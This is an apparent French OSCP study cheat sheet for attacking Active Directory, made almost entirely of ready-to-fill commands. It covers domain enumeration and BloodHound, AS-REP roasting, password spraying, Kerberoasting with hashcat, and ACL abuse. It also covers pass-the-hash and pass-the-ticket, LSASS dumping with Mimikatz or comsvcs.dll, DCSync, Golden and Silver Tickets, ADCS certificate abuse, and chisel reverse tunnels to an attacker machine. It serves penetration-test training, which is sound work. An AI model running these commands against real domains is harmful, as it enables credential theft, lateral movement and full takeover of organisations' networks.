# 04 — Active Directory (Complet)

## 0. Vue d'ensemble — Flow d'attaque AD

```
1. Creds fournis (ou anonymous) → Énumération initiale
2. BloodHound → Cartographier le domaine
3. Attaques sans privs → AS-REP Roast, Password Spray
4. Attaques avec creds → Kerberoast, ACL Abuse
5. Latéralisation → PTH, PTT, Evil-WinRM
6. Élévation → DCSync, Golden/Silver Ticket
7. Dump → Tous les hashes → PTH sur toutes les machines
```

---

## 1. Énumération initiale

### Valider les creds et découvrir le domaine

```bash
# Valider les creds
nxc smb <DC-IP> -u <user> -p <pass>
nxc smb <DC-IP> -u <user> -H <NTLM>              # Pass-the-Hash

# Infos domaine de base
nxc smb <DC-IP> -u <user> -p <pass> --users
nxc smb <DC-IP> -u <user> -p <pass> --groups
nxc smb <DC-IP> -u <user> -p <pass> --pass-pol   # politique de mdp → lockout ?
nxc smb <DC-IP> -u <user> -p <pass> --shares
nxc smb <DC-IP> -u <user> -p <pass> --rid-brute  # bruteforce RID → liste users

# LDAP
nxc ldap <DC-IP> -u <user> -p <pass> --query "(objectClass=user)" ""
nxc ldap <DC-IP> -u <user> -p <pass> --users
nxc ldap <DC-IP> -u <user> -p <pass> --groups

# Enumération via rpcclient
rpcclient -U "<user>%<pass>" <DC-IP>
> enumdomusers
> enumdomgroups
> querygroup 0x200                                # détails d'un groupe (Domain Admins = 0x200)
> querygroupmem 0x200
> queryuser <RID>
```

### Extraire la liste des utilisateurs

```bash
# Via nxc
nxc smb <DC-IP> -u <user> -p <pass> --users | awk '{print $5}' > users.txt

# Via ldapsearch
ldapsearch -x -H ldap://<DC-IP> -D "<user>@<domain>" -w <pass> -b "DC=<domain>,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | awk '{print $2}' > users.txt

# Via enum4linux
enum4linux -u <user> -p <pass> -a <DC-IP>

# Via kerbrute (si anonymous ou Kerberos accessible)
kerbrute userenum --dc <DC-IP> -d <domain> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

---

## 2. BloodHound — Cartographie complète

### Collecte des données

```bash
# Depuis Kali — bloodhound-python
bloodhound-python -u <user> -p <pass> -d <domain> -ns <DC-IP> -c all
bloodhound-python -u <user> -p <pass> -d <domain> -ns <DC-IP> -c all --zip
bloodhound-python -u <user> -H <NTLM> -d <domain> -ns <DC-IP> -c all

# Depuis Windows compromis — SharpHound
.\SharpHound.exe -c all
.\SharpHound.exe -c all --zipfilename bh_results.zip
.\SharpHound.exe -c all,GPOLocalGroup

# Lancer BloodHound
sudo neo4j start
bloodhound &
# Importer le zip dans l'interface
```

### Requêtes BloodHound prioritaires

```
# Dans la barre de recherche "Raw Query" ou via les requêtes pré-définies

1. Find Shortest Paths to Domain Admins
   → Vue d'ensemble du chemin vers DA

2. Find all Kerberoastable Users
   → Utilisateurs avec SPN → Kerberoasting

3. Find AS-REP Roastable Users
   → Utilisateurs sans pré-auth → AS-REP Roasting

4. Find Principals with DCSync Rights
   → Qui peut faire DCSync ?

5. Find computers where Domain Users are Local Admin
   → Accès direct sans escalade

6. Shortest Paths from Owned Principals
   → Depuis les comptes que tu contrôles (clic droit → Mark as Owned)

7. Find all Paths from Domain Users to High Value Targets
   → Chemins accessibles à n'importe quel user du domaine
```

### Interpréter BloodHound — Edges importants

| Edge | Signification | Exploitation |
|---|---|---|
| **GenericAll** | Contrôle total | Reset mdp, ajouter au groupe, ShadowCredentials |
| **GenericWrite** | Écriture partielle | Modifier attributs, SPN pour Kerberoast |
| **WriteDACL** | Modifier les ACL | Se donner GenericAll |
| **WriteOwner** | Changer le propriétaire | Devenir propriétaire puis WriteDACL |
| **ForceChangePassword** | Reset mdp sans connaître l'actuel | net rpc password |
| **AddMember** | Ajouter des membres | Ajouter son compte au groupe |
| **AddSelf** | S'ajouter soi-même | S'ajouter directement |
| **AllExtendedRights** | Droits étendus | DCSync, ForceChangePassword |
| **Owns** | Propriétaire de l'objet | WriteDACL → GenericAll |
| **CanRDP** | RDP autorisé | Accès bureau distant |
| **CanPSRemote** | WinRM autorisé | Evil-WinRM |
| **ExecuteDCOM** | DCOM disponible | Exécution de commandes |
| **HasSession** | Session active | Voler token si admin local |

---

## 3. Attaques sans creds (ou anonymous)

### AS-REP Roasting

> Cible : users avec "Do not require Kerberos preauthentication" coché

```bash
# Sans creds — si liste d'users connue
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <DC-IP>
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <DC-IP> -outputfile asrep.txt

# Avec creds valides — trouve automatiquement les users vulnérables
GetNPUsers.py <domain>/<user>:<pass> -request -dc-ip <DC-IP>
nxc ldap <DC-IP> -u <user> -p <pass> --asreproast asrep.txt

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

### Password Spraying

```bash
# ⚠️ Vérifier la politique de lockout AVANT : nxc smb <DC-IP> ... --pass-pol
# Respecter le threshold (souvent 5 tentatives)

nxc smb <DC-IP> -u users.txt -p <password> --continue-on-success
nxc smb <DC-IP> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Mots de passe courants à tester
# <Saison><Année>! → Spring2024!, Winter2025!
# <NomEntreprise>123
# Welcome1, Password1, P@ssw0rd

# Depuis Kali sans nxc
kerbrute passwordspray -d <domain> --dc <DC-IP> users.txt <password>
```

---

## 4. Attaques avec creds valides

### Kerberoasting

> Cible : comptes de service avec SPN (Service Principal Name)

```bash
# Lister les comptes Kerberoastables
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC-IP>
nxc ldap <DC-IP> -u <user> -p <pass> --kerberoasting kerb.txt

# Demander les tickets
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC-IP> -request
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC-IP> -request -outputfile kerb.txt

# Avec hash NTLM
GetUserSPNs.py <domain>/<user> -hashes :<NTLM> -dc-ip <DC-IP> -request

# Crack
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt

# AES Kerberoasting (si RC4 désactivé)
hashcat -m 19700 kerb_aes256.txt /usr/share/wordlists/rockyou.txt
```

### Énumération des shares

```bash
nxc smb <scope> -u <user> -p <pass> --shares
nxc smb <scope> -u <user> -p <pass> -M spider_plus    # spider tous les shares
nxc smb <scope> -u <user> -p <pass> -M spider_plus -o READ_ONLY=False

# Monter un share manuellement
smbclient \\\\<IP>\\<share> -U <domain>/<user>%<pass>
mount -t cifs //<IP>/<share> /mnt/share -o username=<user>,password=<pass>,domain=<domain>
```

---

## 5. ACL Abuse — Exploitation des droits

### GenericAll sur un utilisateur

```bash
# Reset du mot de passe
net rpc password <targetuser> <newpass> -U <domain>/<user>%<pass> -S <DC-IP>

# Via PowerView (depuis Windows)
Set-DomainUserPassword -Identity <targetuser> -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Verbose

# Targeted Kerberoasting — ajouter un SPN au compte cible
Set-DomainObject -Identity <targetuser> -Set @{serviceprincipalname='fake/BLAH'}
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC-IP> -request
# Cracker le hash → accès au compte cible
```

### GenericAll / GenericWrite sur un ordinateur

```bash
# Shadow Credentials (si ADCS disponible)
certipy shadow auto -u <user>@<domain> -p <pass> -account <computer$> -dc-ip <DC-IP>

# Resource-Based Constrained Delegation (RBCD)
# 1. Créer un compte machine
addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'Password123!' -dc-ip <DC-IP> '<domain>/<user>:<pass>'

# 2. Configurer RBCD
rbcd.py -delegate-to '<targetcomputer$>' -delegate-from 'ATTACKER$' -action write '<domain>/<user>:<pass>' -dc-ip <DC-IP>

# 3. Obtenir un ticket de service
getST.py -spn 'cifs/<targetcomputer>.<domain>' -impersonate Administrator -dc-ip <DC-IP> '<domain>/ATTACKER$:Password123!'

# 4. Utiliser le ticket
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass <targetcomputer>.<domain>
```

### GenericAll sur un groupe

```bash
# Ajouter utilisateur au groupe
net rpc group addmem "<group>" <user> -U <domain>/<user>%<pass> -S <DC-IP>

# Via PowerView
Add-DomainGroupMember -Identity '<group>' -Members '<user>' -Verbose
```

### WriteDACL sur le domaine

```bash
# S'accorder DCSync rights
dacledit.py -action write -rights DCSync -principal <user> -target-dn "DC=<domain>,DC=local" '<domain>/<user>:<pass>' -dc-ip <DC-IP>

# Via PowerView
Add-DomainObjectAcl -TargetIdentity '<domain>' -PrincipalIdentity '<user>' -Rights DCSync
```

### ForceChangePassword

```bash
net rpc password <targetuser> <newpass> -U <domain>/<user>%<pass> -S <DC-IP>
```

### WriteOwner

```bash
# 1. Prendre la propriété
owneredit.py -action write -new-owner <user> -target <targetobject> '<domain>/<user>:<pass>' -dc-ip <DC-IP>

# 2. Ajouter WriteDACL à soi-même
dacledit.py -action write -rights FullControl -principal <user> -target <targetobject> '<domain>/<user>:<pass>' -dc-ip <DC-IP>

# 3. Exploiter comme GenericAll
```

---

## 6. Latéralisation

### Pass-the-Hash (PTH)

```bash
# Vérifier accès
nxc smb <IP> -u <user> -H <NTLM>
nxc smb <scope> -u <user> -H <NTLM> --continue-on-success

# Shell
evil-winrm -i <IP> -u <user> -H <NTLM>
psexec.py <domain>/<user>@<IP> -hashes :<NTLM>
wmiexec.py <domain>/<user>@<IP> -hashes :<NTLM>
smbexec.py <domain>/<user>@<IP> -hashes :<NTLM>

# Si local admin (pas domain admin)
nxc smb <IP> -u Administrator -H <NTLM> --local-auth
```

### Pass-the-Ticket (PTT)

```bash
# Obtenir un TGT
getTGT.py <domain>/<user>:<pass>
getTGT.py <domain>/<user> -hashes :<NTLM>

# Utiliser le ticket
export KRB5CCNAME=<user>.ccache
nxc smb <IP> -k --no-pass
psexec.py -k -no-pass <domain>/<user>@<hostname>.<domain>
wmiexec.py -k -no-pass <domain>/<user>@<hostname>.<domain>
secretsdump.py -k -no-pass <hostname>.<domain>

# ⚠️ Avec PTT → utiliser le FQDN (hostname.domain) pas l'IP
```

### Overpass-the-Hash

```bash
# Hash NTLM → TGT Kerberos
getTGT.py <domain>/<user> -hashes :<NTLM> -dc-ip <DC-IP>
export KRB5CCNAME=<user>.ccache
# Utiliser comme PTT
```

### Evil-WinRM

```bash
evil-winrm -i <IP> -u <user> -p <pass>
evil-winrm -i <IP> -u <user> -H <NTLM>
evil-winrm -i <IP> -u <user> -p <pass> -s /path/to/ps1/scripts/   # charger scripts PS1
evil-winrm -i <IP> -u <user> -p <pass> -e /path/to/executables/   # charger exécutables
```

---

## 7. Dump de credentials — Depuis une machine compromise

### Depuis Windows

```powershell
# Mimikatz — dump LSASS
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
lsadump::sam
lsadump::secrets
lsadump::cache                                    # domain creds mis en cache

# Via comsvcs.dll (sans Mimikatz)
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full
# Analyser depuis Kali :
pypykatz lsa minidump lsass.dmp
```

### Depuis Kali avec creds/hash

```bash
# SAM (machine locale)
secretsdump.py <domain>/<user>:<pass>@<IP>
secretsdump.py <domain>/<user>@<IP> -hashes :<NTLM>

# NTDS (Domain Controller)
secretsdump.py <domain>/<user>:<pass>@<DC-IP>
secretsdump.py -just-dc-ntlm <domain>/<user>:<pass>@<DC-IP>
secretsdump.py -just-dc-ntlm -just-dc-user Administrator <domain>/<user>:<pass>@<DC-IP>
```

---

## 8. DCSync — Dump de tout le domaine

> Nécessite : Domain Admin, ou compte avec GetChanges + GetChangesAll

```bash
# Depuis Kali
secretsdump.py <domain>/<user>:<pass>@<DC-IP>
secretsdump.py <domain>/<user>@<DC-IP> -hashes :<NTLM>
secretsdump.py -just-dc-ntlm <domain>/<user>:<pass>@<DC-IP>

# Via Mimikatz (depuis Windows)
lsadump::dcsync /domain:<domain> /user:Administrator
lsadump::dcsync /domain:<domain> /all /csv
lsadump::dcsync /domain:<domain> /user:krbtgt        # pour Golden Ticket

# Via nxc
nxc smb <DC-IP> -u <user> -p <pass> --ntds
```

---

## 9. Golden Ticket & Silver Ticket

### Golden Ticket

> Nécessite : hash NTLM du compte **krbtgt** → accès total illimité

```bash
# 1. Récupérer le hash krbtgt et le SID du domaine
secretsdump.py <domain>/<user>:<pass>@<DC-IP> | grep krbtgt
# SID du domaine : S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

# 2. Créer le Golden Ticket
ticketer.py -nthash <krbtgt_NTLM> -domain-sid <SID> -domain <domain> Administrator

# 3. Utiliser
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <domain>/Administrator@<DC-hostname>.<domain>
```

### Silver Ticket

> Nécessite : hash NTLM du compte machine ($) → accès à ce service uniquement

```bash
# Créer Silver Ticket pour CIFS (partage)
ticketer.py -nthash <machine_NTLM> -domain-sid <SID> -domain <domain> -spn cifs/<hostname>.<domain> Administrator

export KRB5CCNAME=Administrator.ccache
smbclient -k ///<hostname>.<domain>/C$
```

---

## 10. ADCS — Active Directory Certificate Services

> Souvent présent, souvent vulnérable, souvent ignoré

```bash
# Enumérer les templates vulnérables
certipy find -u <user>@<domain> -p <pass> -dc-ip <DC-IP> -vulnerable

# ESC1 — Template permet SAN arbitraire
certipy req -u <user>@<domain> -p <pass> -dc-ip <DC-IP> -ca <CA-NAME> -template <TEMPLATE> -upn Administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
# → Obtient hash NTLM de Administrator

# ESC4 — WriteProperty sur le template
certipy template -u <user>@<domain> -p <pass> -dc-ip <DC-IP> -template <TEMPLATE> -save-old
certipy req -u <user>@<domain> -p <pass> -dc-ip <DC-IP> -ca <CA-NAME> -template <TEMPLATE> -upn Administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>

# Lister les CAs
certipy find -u <user>@<domain> -p <pass> -dc-ip <DC-IP>
```

---

## 11. Depuis Windows — Énumération sans outils

```powershell
# Infos domaine de base
whoami /all
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Domain Controllers" /domain
nltest /dclist:<domain>
nltest /domain_trusts

# Ordinateurs du domaine
net view /domain:<domain>
Get-ADComputer -Filter * | Select-Object Name

# Sessions actives sur les machines (si admin)
net session

# PowerView — énumération avancée
Get-DomainUser
Get-DomainUser -SPN                               # Kerberoastable
Get-DomainUser -PreauthNotRequired                # AS-REP Roastable
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainComputer
Get-DomainGPO
Find-LocalAdminAccess                             # où tu es admin local ?
Get-ObjectAcl -Identity <user> -ResolveGUIDs     # ACL sur un objet
Find-InterestingDomainAcl -ResolveGUIDs          # ACL intéressantes dans le domaine
```

---

## 12. Pivoting vers d'autres machines

```bash
# Chisel — tunnel TCP
# Sur Kali
./chisel server -p 8080 --reverse

# Sur la machine compromise (Windows)
.\chisel.exe client <KALI>:8080 R:socks

# Proxychains
# /etc/proxychains4.conf → ajouter : socks5 127.0.0.1 1080
proxychains nxc smb <internal-IP> -u <user> -p <pass>
proxychains secretsdump.py <domain>/<user>:<pass>@<internal-DC>

# Port forwarding simple (exposer un port interne)
.\chisel.exe client <KALI>:8080 R:8888:127.0.0.1:8888
```

---

## 13. Checklist AD — Exam OSCP

```
[ ] Creds validés sur le DC (nxc smb)
[ ] Politique de lockout vérifiée (--pass-pol)
[ ] bloodhound-python lancé
[ ] BloodHound analysé → chemin vers DA identifié
[ ] AS-REP Roasting tenté
[ ] Kerberoasting tenté
[ ] Password Spray si liste users disponible
[ ] Shares énumérés et contenu lu
[ ] ACL BloodHound exploitées
[ ] Latéralisation vers toutes les machines accessibles
[ ] DCSync effectué → tous les hashes récupérés
[ ] Pass-the-Hash sur toutes les machines du scope
[ ] proof.txt récupéré sur chaque machine
[ ] Screenshots avec whoami + hostname + ipconfig sur chaque machine
```

---

## Ressources
- [HackTricks — AD](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [PayloadsAllTheThings — AD](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [The Hacker Recipes](https://www.thehacker.recipes)
- [Certipy — ADCS](https://github.com/ly4k/Certipy)

---

## Tags
#oscp #activedirectory #ad #kerberos #bloodhound #dcsync #acl #adcs #kerberoasting #asreproasting
